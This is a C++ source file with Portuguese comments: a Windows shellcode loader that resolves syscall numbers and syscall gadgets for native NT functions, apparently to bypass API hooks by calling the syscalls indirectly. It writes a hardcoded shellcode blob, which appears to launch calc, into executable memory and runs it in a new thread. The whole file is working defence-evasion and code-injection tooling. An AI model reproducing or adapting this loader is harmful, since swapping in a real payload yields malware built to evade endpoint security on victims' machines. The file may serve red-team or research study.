#include "helper.h"

SYSCALL_ENTRY Syscalls[SYSCALL_COUNT] =
{
	{ "NtAllocateVirtualMemory",   0, nullptr, FALSE },
	{ "NtWriteVirtualMemory",      0, nullptr, FALSE },
	{ "NtCreateThreadEx",          0, nullptr, FALSE },
	{ "NtWaitForSingleObject",     0, nullptr, FALSE },
	{ "NtClose",                   0, nullptr, FALSE }
};

//shellcode
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x61\x6c\x63\x00";

int main() {
	NTSTATUS Status = STATUS_SUCCESS;
	BOOL StatusPopulateSyscallTable;
	SIZE_T shellcodesize = sizeof(shellcode);

	HANDLE hProcess = GetCurrentProcess();
	HANDLE hThread = nullptr;
	PVOID Buffer = nullptr;

	StatusPopulateSyscallTable = InitializeSycallTable();

	if (!StatusPopulateSyscallTable) {
		printf("[!] Falha ao popular tabela de Sycalls\n");
	}

	printf("[+] Tabela de Syscalls populada\n");

	// Joga os SSN's e gadgets para o assembly
	GetSSNFromSyscallTable("NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySSN);
	GetGadgetFromSyscallTable("NtAllocateVirtualMemory", &g_NtAllocateVirtualMemorySyscall);
	GetSSNFromSyscallTable("NtWriteVirtualMemory", &g_NtWriteVirtualMemorySSN);
	GetGadgetFromSyscallTable("NtWriteVirtualMemory", &g_NtWriteVirtualMemorySyscall);
	GetSSNFromSyscallTable("NtCreateThreadEx", &g_NtCreateThreadExSSN);
	GetGadgetFromSyscallTable("NtCreateThreadEx", &g_NtCreateThreadExSyscall);
	GetSSNFromSyscallTable("NtWaitForSingleObject", &g_NtWaitForSingleObjectSSN);
	GetGadgetFromSyscallTable("NtWaitForSingleObject", &g_NtWaitForSingleObjectSyscall);
	GetSSNFromSyscallTable("NtClose", &g_NtCloseSSN);
	GetGadgetFromSyscallTable("NtClose", &g_NtCloseSyscall);

	// Execução de um shellcode injection com funções nativas
	Status = NtAllocateVirtualMemory(
		hProcess,
		&Buffer,
		0,
		&shellcodesize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	
	if (!NT_SUCCESS(Status)) {
		printf("[!] Falha ao alocar memória: 0x%X\n", Status);
		return 1;
	}

	printf("[+] Memória alocada em: 0x%p\n", Buffer);

	Status = NtWriteVirtualMemory(
		hProcess,
		Buffer,
		shellcode,
		shellcodesize,
		nullptr);

	if (!NT_SUCCESS(Status)) {
		printf("[!] Falha ao escrever na memória: 0x%X\n", Status);
		return 1;
	}

	printf("[+] Shellcode escrito em: 0x%p\n", Buffer);

	Status = NtCreateThreadEx(
		&hThread,
		THREAD_ALL_ACCESS,
		nullptr,
		hProcess,
		Buffer,
		nullptr,
		FALSE,
		0,
		0,
		0,
		nullptr);

	if (!NT_SUCCESS(Status)) {
		printf("[!] Falha ao criar thread: 0x%X\n", Status);
		return 1;
	}

	printf("[+] Thread criada com sucesso: 0x%p\n", hThread);

	Status = NtWaitForSingleObject(
		hThread,
		FALSE,
		nullptr);

	if (!NT_SUCCESS(Status)) {
		printf("[!] Falha ao esperar pela thread: 0x%X\n", Status);
		return 1;
	}

	printf("[+] Thread finalizada com sucesso\n");

	Status = NtClose(hThread);

	if (!NT_SUCCESS(Status)) {
		printf("[!] Falha ao fechar handle da thread: 0x%X\n", Status);
		return 1;
	}

	printf("[+] Handle da thread fechado com sucesso\n");
	printf("[+] Shellcode executado com sucesso\n");

	return 0;
}